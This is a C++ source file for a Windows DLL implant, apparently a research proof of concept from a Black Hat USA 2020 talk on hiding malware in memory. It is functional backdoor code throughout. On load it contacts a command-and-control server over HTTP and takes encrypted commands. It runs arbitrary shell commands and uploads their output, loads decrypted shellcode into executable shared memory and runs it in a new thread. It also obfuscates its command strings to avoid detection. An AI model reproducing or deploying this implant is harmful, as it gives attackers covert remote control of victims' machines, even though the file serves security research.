/*
*    Copyright (c) 2020, Frank Block, ERNW Research GmbH <fblock@ernw.de>
*
*       All rights reserved.
*
*       Redistribution and use in source and binary forms, with or without modification,
*       are permitted provided that the following conditions are met:
*
*       * Redistributions of source code must retain the above copyright notice, this
*         list of conditions and the following disclaimer.
*       * Redistributions in binary form must reproduce the above copyright notice,
*         this list of conditions and the following disclaimer in the documentation
*         and/or other materials provided with the distribution.
*       * The names of the contributors may not be used to endorse or promote products
*         derived from this software without specific prior written permission.
*
*       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
*       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
*       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
*       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#include "stdafx.h"
#include "ReflectiveLoader.h"
#include "http.h"
#include "byte_mod.h"
#include "houdini.h"

void init_cmd_strings();
BOOL contact_cnc(void);
BOOL execute_this(command_struct received_command);
std::string exec(const char* cmd);
HANDLE load_given_shellcode(command_struct received_command);

#ifdef _DEBUG
	#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d\n", e, GetLastError() ); break; }
#else
	#define BREAK_WITH_ERROR( e ) { break; }
#endif

extern HINSTANCE hAppInstance;
HANDLE shmInstanceHandle = NULL;

HANDLE shellcodeMemHandle = NULL;
BOOL cmdStringsInitialized = FALSE;
BOOL showMainMessageBox = TRUE;
#define execute_this_cmdstring_len 25
#define load_shellcode_cmdstring_len 29
#define run_shellcode_cmdstring_len 27
#define reveal_data_cmdstring_len 23
char execute_this_cmdstring[execute_this_cmdstring_len];
char load_shellcode_cmdstring[load_shellcode_cmdstring_len];
char run_shellcode_cmdstring[run_shellcode_cmdstring_len];
char reveal_data_cmdstring[reveal_data_cmdstring_len];


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;
	
	switch( dwReason ) 
    { 
		case DLL_SET_INSTANCE:
			hAppInstance = hinstDLL;
			shmInstanceHandle = lpReserved;
			break;
		case DLL_QUERY_HANDLE:
			if (lpReserved != NULL)
				*(HANDLE *)lpReserved = shmInstanceHandle;
		break;
		case DLL_QUERY_HMODULE:
			if (lpReserved != NULL)
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			if (lpReserved)
				MessageBoxA(NULL, hidden_token, "Hello Black Hat USA 2020!!!", MB_OK);

			if (!cmdStringsInitialized)
				init_cmd_strings();

			if (showMainMessageBox)
				MessageBoxA(NULL, "Hello Black Hat USA 2020!!!", "Hello Black Hat USA 2020!!!", MB_OK);

#ifndef _DEBUG
			showMainMessageBox = FALSE;
#endif

			//TODO returning FALSE here does seem to break loop. recheck
			contact_cnc();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
			hAppInstance = hinstDLL;
			break;
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}


BOOL contact_cnc(){
	BOOL result = FALSE;
#ifdef _DEBUG
	printf("Trying to contact C&C server...\n");
#endif
	command_struct received_command = send_http("", get_cmd_path);
	do{
		if (received_command.command == NULL)
			BREAK_WITH_ERROR("Empty command received. Aborting...");

#ifdef _DEBUG
		MessageBoxA(NULL, received_command.command, "Received command:", MB_OK);
#endif
		// For analysis purposes. Keeps hidden shared memory mapped and hence detectable.
		if (strcmp(received_command.command, reveal_data_cmdstring) == 0){
			LPVOID shellcodeMemPointer = NULL;
			if (shellcodeMemHandle)
				shellcodeMemPointer = MapViewOfFile(shellcodeMemHandle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);

#ifdef _DEBUG
			MessageBoxA(NULL, "DLL and shellcode (if loaded) is now visible for the defined number of seconds.", "Sleeping Zzzzzz", MB_OK);
			printf("[+] DLL and shellcode (if loaded) is now visible. Sleeping for %d milli seconds.\n", reveal_command_timeout);
#endif
			send_http("DLL and shellcode (if loaded) is now visible. Sleeping initiated...", upload_path);
			Sleep(reveal_command_timeout);

#ifdef _DEBUG
			MessageBoxA(NULL, "Sleeping done. Time to rehide.", "Sleeping Zzzzzz", MB_OK);
			printf("[+] Sleeping done. Time to rehide.\n");
#endif
			send_http("Sleeping done. Time to rehide.", upload_path);
			UnmapViewOfFile(shellcodeMemPointer);
			result = TRUE;
		}

		// Executes given command
		else if (strcmp(received_command.command, execute_this_cmdstring) == 0){
			result = execute_this(received_command);
		}

		// loads the given shellcocde in a separate shared memory segment
		else if (strcmp(received_command.command, load_shellcode_cmdstring) == 0){
#ifdef _DEBUG
			printf("Starting shellcode loading...\n");
#endif
			// Get rid of any potentially previously loaded shellcode
			if (shellcodeMemHandle)
				CloseHandle(shellcodeMemHandle);

			shellcodeMemHandle = load_given_shellcode(received_command);
			if (shellcodeMemHandle){
#ifdef _DEBUG
				MessageBoxA(NULL, "[+] Shellcode loaded successfully.", "load_shellocde:", MB_OK);
#endif
				send_http("Shellcode loaded successfully.", upload_path);
				result = TRUE;
			}
			else{
#ifdef _DEBUG
				MessageBoxA(NULL, "Something went wrong while loading shellcode.", "load_shellocde:", MB_OK);
				printf("Something went wrong while loading shellcode.\n");
#endif
				send_http("Something went wrong while loading shellcode.", upload_path);
				result = FALSE;
			}
		}

		// executes the previously loaded shellcode
		else if (strcmp(received_command.command, run_shellcode_cmdstring) == 0){
			if (shellcodeMemHandle == NULL){
				send_http("Shellcode execution triggered but no shellcode loaded.", upload_path);
				BREAK_WITH_ERROR("Shellcode execution triggered but no shellcode loaded.");
			}
#ifdef _DEBUG
			MessageBoxA(NULL, "Starting Shellcode execution...", "run_shellocde:", MB_OK);
#endif
			LPVOID shellcodeMemPointer = MapViewOfFile(shellcodeMemHandle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
			if (!shellcodeMemPointer)
				BREAK_WITH_ERROR("Error while mapping shellcode.");

			HANDLE shellcodeThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeMemPointer, NULL, 0, NULL);
			if (!shellcodeThreadHandle){
#ifdef _DEBUG
				MessageBoxA(NULL, "Something went wrong while mapping and executing shellcode.", "run_shellocde:", MB_OK);
#endif
				result = FALSE;
				BREAK_WITH_ERROR("Something went wrong while mapping and executing shellcode.");
			}

			send_http("Shellcode started successfully.", upload_path);

#ifdef _DEBUG
			MessageBoxA(NULL, "Shellcode started successfully and is currently running...", "run_shellocde:", MB_OK);
			printf("[+] Shellcode started successfully and is currently running...\n");
#endif
			WaitForSingleObject(shellcodeThreadHandle, -1);
			result = TRUE;

			BOOL unmapresult = UnmapViewOfFile(shellcodeMemPointer);
#ifdef _DEBUG
			if (unmapresult)
				printf("Shellcode unmapped successfully.\n");
			else
				printf("Something went wrong while unmapping shellcode.\n");
#endif
		}

		// unknown command
		else{
			send_http("The command received is unknown.", upload_path);
#ifdef _DEBUG
			printf("ERROR: unknown command given.\n");
			MessageBoxA(NULL, "Unknown command given.", "Error:", MB_OK);
#endif
		}
	} while (0);
	// TODO try/catch
	if (received_command.buffer != NULL)
		memset(received_command.buffer, 0, received_command.buffer_size);
	if (received_command.command != NULL)
		memset(received_command.command, 0, strlen(received_command.command));
	return FALSE;
}

BOOL execute_this(command_struct received_command){
	BOOL result = FALSE;

	endecrypt_inplace(received_command.buffer, received_command.buffer_size, secret);
	received_command.buffer[received_command.buffer_size] = '\x00';
#ifdef _DEBUG
	printf("[+] This command will now be executed: %s\n", received_command.buffer);
#endif
	
	std::string res = exec(received_command.buffer);
	if (strcmp(res.c_str(), "__ERROR__") == 0)
		return FALSE;

	const char* output = res.c_str();
#ifdef _DEBUG
	MessageBoxA(NULL, output, received_command.buffer, MB_OK);
#endif

#ifdef _DEBUG
	printf("Execution output: %s\n", output);
#endif
	send_http((char*)output, upload_path);

	return result;
}


std::string exec(const char* cmd) {
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) return "__ERROR__";
	char buffer[128];
	std::string result = "";
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe) != NULL)
			result += buffer;
	}
	_pclose(pipe);
	return result;
}


HANDLE load_given_shellcode(command_struct received_command){

#ifdef _DEBUG
	printf("Creating file mapping with a size of %d for shellcode.\n", received_command.buffer_size);
#endif
	HANDLE sharedMemHandle = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, received_command.buffer_size, NULL);

	if (sharedMemHandle){
#ifdef _DEBUG
		printf("Creation was successfull.\n");
#endif
		LPVOID shellcodeMemPointer = MapViewOfFile(sharedMemHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		memcpy(shellcodeMemPointer, received_command.buffer, received_command.buffer_size);
		endecrypt_inplace((char*)shellcodeMemPointer, received_command.buffer_size, secret);
		UnmapViewOfFile(shellcodeMemPointer);
	}
#ifdef _DEBUG
	else
		printf("Creation failed.\n");
#endif
	return sharedMemHandle;
}

void init_cmd_strings(){
	get_encrypted_hexstring(execute_this_cmdstring, execute_this_cmdstring_len, "execute_this", secret);
	get_encrypted_hexstring(reveal_data_cmdstring, reveal_data_cmdstring_len, "reveal_data", secret);
	get_encrypted_hexstring(load_shellcode_cmdstring, load_shellcode_cmdstring_len, "load_shellcode", secret);
	get_encrypted_hexstring(run_shellcode_cmdstring, run_shellcode_cmdstring_len, "run_shellcode", secret);

	cmdStringsInitialized = TRUE;
}
